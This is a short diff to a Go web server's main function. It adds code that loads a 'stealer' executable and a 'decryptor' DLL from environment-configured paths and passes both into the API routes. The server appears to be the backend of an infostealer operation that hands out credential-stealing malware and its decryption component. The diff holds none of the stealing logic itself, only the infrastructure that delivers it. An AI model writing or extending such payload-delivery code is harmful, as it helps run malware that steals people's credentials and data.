@@ -101,7 +101,31 @@ func main() {
 
 	r.Get("/ws", ws.ServeWs(wsHub, jwtSecret))
 
-	api.SetupRoutes(r, sqlDB, jwtSecret, allowedOrigins, wsHub)
+	stealerPath := getEnv("STEALER_EXE_PATH", "")
+	var stealerExe []byte
+	if stealerPath != "" {
+		var err error
+		stealerExe, err = os.ReadFile(stealerPath)
+		if err != nil {
+			slog.Error("failed to read stealer exe", "path", stealerPath, "err", err)
+			os.Exit(1)
+		}
+		slog.Info("loaded stealer executable", "path", stealerPath, "size", len(stealerExe))
+	}
+
+	decryptorPath := getEnv("DECRYPTOR_DLL_PATH", "")
+	var decryptorDll []byte
+	if decryptorPath != "" {
+		var err error
+		decryptorDll, err = os.ReadFile(decryptorPath)
+		if err != nil {
+			slog.Error("failed to read decryptor DLL", "path", decryptorPath, "err", err)
+			os.Exit(1)
+		}
+		slog.Info("loaded decryptor DLL", "path", decryptorPath, "size", len(decryptorDll))
+	}
+
+	api.SetupRoutes(r, sqlDB, jwtSecret, allowedOrigins, wsHub, stealerExe, decryptorDll)
 
 	distFS, err := fs.Sub(frontendFS, "frontend/dist")
 	if err != nil {
